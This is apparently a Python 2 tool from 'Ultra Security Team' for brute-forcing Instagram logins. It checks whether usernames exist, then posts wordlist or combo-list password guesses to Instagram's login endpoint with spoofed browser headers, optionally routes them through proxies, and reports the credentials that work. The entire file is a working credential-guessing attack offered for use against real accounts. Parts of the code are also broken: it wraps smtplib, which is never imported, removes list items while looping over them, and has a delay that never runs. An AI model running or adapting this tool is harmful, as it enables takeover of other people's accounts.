#!/usr/bin/env python
# -*- coding: UTF-8 -*-

# 	Ultra Security Team

#  Telegram: @ultrasecurity
#  Website : https://ultrasec.org

"""
copyrigth(c) 2018 ultra security team
author: siruidops
:D 
"""

import sys
try:
	import socks
except ImportError:
	sys.exit('Please install pysocks library (pip install pysocks)')
try:
	import requests
except ImportError:
	sys.exit('Please install requests library (pip install library)')
from color import *
import time
import datetime
import socket
import os
from socks import *

def run(usernames,passwords,comboAttack=False):
	if comboAttack:
		combo(usernames,passwords)
		sys.exit()
	else:
		pass
	print
	print yellow+" [+] Status attack ..."+end
	username = usernames.split('\n')
	password = passwords.split('\n')
	DELAY_BETWEEN = 4
	proxy(username,password)

def combo(username,password):
	print
	print green+" [*] Combo List Loaded !"+end
	print yellow+" [*] Status attack ..."+end
	emails = username.split('\n')
	passwds = password.split('\n')
	proxy(emails,passwds,comboT=True)
	users = emails
	for user in emails:
		passwd = passwds[emails.index(user)]
		users.remove(user)
		passwds.remove(passwd)
		user = user.strip()
		passwd = passwd.strip()
		r = requests.get('https://www.instagram.com/%s/?__a=1' %(user.strip()))
		if r.status_code == 404:
			print red+" [-] Username not found (%s%s%s)%s"%(yellow,user.strip(),red,end)
			continue
		else:
			pass
		sess = requests.Session()
		sess.cookies.update ({'sessionid' : '', 'mid' : '', 'ig_pr' : '1', 'ig_vw' : '1920', 'csrftoken' : '',  's_network' : '', 'ds_user_id' : ''})
		sess.headers.update({
			'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36',
			'x-instagram-ajax':'1',
			'X-Requested-With': 'XMLHttpRequest',
			'origin': 'https://www.instagram.com',
			'ContentType' : 'application/x-www-form-urlencoded',
			'Connection': 'keep-alive',
			'Accept': '*/*',
			'Referer': 'https://www.instagram.com',
			'authority': 'www.instagram.com',
			'Host' : 'www.instagram.com',
			'Accept-Language' : 'en-US;q=0.6,en;q=0.4',
			'Accept-Encoding' : 'gzip, deflate'
		})
		sess.headers.update({'X-CSRFToken' : sess.get('https://www.instagram.com/').cookies.get_dict()['csrftoken']})
		r = sess.post('https://www.instagram.com/accounts/login/ajax/', data={
			'username':user, 
			'password':passwd
		}, allow_redirects=True)
		print yellow+" Try: (%s%s%s) [%s%s%s] %s"%(end,user,yellow,end,passwd,yellow,end)
		if 'authenticated' in r.text:
			if r.json()['authenticated']:
				print
				print green+" [*] Founded: (%s%s%s) [%s%s%s] %s"%(yellow,user,green,yellow,passwd,green,end)
				print
				try:
					raw_input(tur+"Please enter to continue ..."+end)
				except KeyboardInterrupt:
					sys.exit(red+" Bye :D ..."+end)
			else:
				print red+" Invalid (%s%s%s) [%s%s%s] %s"%(yellow,user,red,yellow,passwd,red,end)
				time.sleep(DELAY_BETWEEN)
				continue

def proxy(username,password,comboT=False):
	print
	print green+"	Do you want to use a proxy?"+end
	print
	print "	%s1) %sYes            %s2) %sNo%s"%(pur,blue,pur,blue,end)
	print
	try:
			re = raw_input("%sultrabrute%s@%sultrasec%s:/%saccount%s/%sinstagram%s# "%(green,end,pur,end,pur,end,pur,end))
	except KeyboardInterrupt:
			sys.exit(red+'Bye :D ...'+end)
	if re == '1':
		os.system('clear')
		print
		print green+"	Please select a proxy type"+end
		print
		print "	%s1) %sHTTP            %s2) %sSOCKS 5"%(pur,blue,pur,blue)
		print "    %s3) %sSOCKS 4         %s4) %sNoProxt%s"%(pur,blue,pur,blue,end)
		print
		try:
			re = raw_input("%sultrabrute%s@%sultrasec%s:/%saccount%s/%sinstagram%s# "%(green,end,pur,end,pur,end,pur,end))
		except KeyboardInterrupt:
			sys.exit(red+'Bye :D ...'+end)
		print 
		print green+"	Please enter your proxy (example: 0.0.0.0:8080)"+end
		print
		try:
			proxies = raw_input("%sultrabrute%s@%sultrasec%s:/%saccount%s/%sinstagram%s# "%(green,end,pur,end,pur,end,pur,end))
		except KeyboardInterrupt:
			sys.exit(red+'Bye :D ...'+end)
		if ':' in proxies:
			buffer = proxies.split(':')
			ipProxy = buffer[0]
			portProxy = buffer[-1]
		else:
			sys.exit(red+' Proxy invalid: Bye :D ...'+end)
		if re == '1':
			# HTTP
			socks.setdefaultproxy(PROXY_TYPE_HTTP,ipProxy,portProxy)
			socks.wrapmodule(smtplib)
		elif re == '2':
			# SOCKS 5
			socks.setdefaultproxy(PROXY_TYPE_SOCKS5,ipProxy,portProxy)
			socks.wrapmodule(smtplib)
		elif re == '3':
			# SOCKS 4
			socks.setdefaultproxy(PROXY_TYPE_SOCKS4,ipProxy,portProxy)
			socks.wrapmodule(smtplib)
		elif re == '4':
			if comboT:
				pass
			else:
				attack(username,password)
	else:
		if comboT:
			pass
		else:
			attack(username,password)

username1s = []
password1s = []
def attack(users,passwds):
	username1s = users
	password1s = passwds
	for user in username1s:
		r = requests.get('https://www.instagram.com/%s/?__a=1' %(user.strip()))
		if r.status_code == 404:
			print red+" [-] Username not found (%s%s%s)%s"%(yellow,user.strip(),red,end)
			continue
		else:
			pass
		user = user.strip()
		username1s.remove(user)
		for passwd in password1s:
			passwd = passwd.strip()
			password1s.remove(passwd)
			sess = requests.Session()
			sess.cookies.update ({'sessionid' : '', 'mid' : '', 'ig_pr' : '1', 'ig_vw' : '1920', 'csrftoken' : '',  's_network' : '', 'ds_user_id' : ''})
			sess.headers.update({
				'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36',
				'x-instagram-ajax':'1',
				'X-Requested-With': 'XMLHttpRequest',
				'origin': 'https://www.instagram.com',
				'ContentType' : 'application/x-www-form-urlencoded',
				'Connection': 'keep-alive',
				'Accept': '*/*',
				'Referer': 'https://www.instagram.com',
				'authority': 'www.instagram.com',
				'Host' : 'www.instagram.com',
				'Accept-Language' : 'en-US;q=0.6,en;q=0.4',
				'Accept-Encoding' : 'gzip, deflate'
			})
			sess.headers.update({'X-CSRFToken' : sess.get('https://www.instagram.com/').cookies.get_dict()['csrftoken']})
			r = sess.post('https://www.instagram.com/accounts/login/ajax/', data={
				'username':user, 
				'password':passwd
			}, allow_redirects=True)
			print yellow+" Try: %s %s"%(passwd,end)
			if 'authenticated' in r.text:
				if r.json()['authenticated']:
					print
					print green+" [*] Founded: (%s%s%s) [%s%s%s] %s"%(yellow,user,green,yellow,passwd,green,end)
					print
					try:
						raw_input(tur+"Please enter to continue ..."+end)
					except KeyboardInterrupt:
						sys.exit(red+" Bye :D ..."+end)
				else:
					print red+" Invalid (%s%s%s) [%s%s%s] %s"%(yellow,user,red,yellow,passwd,red,end)
					continue
					time.sleep(DELAY_BETWEEN)
					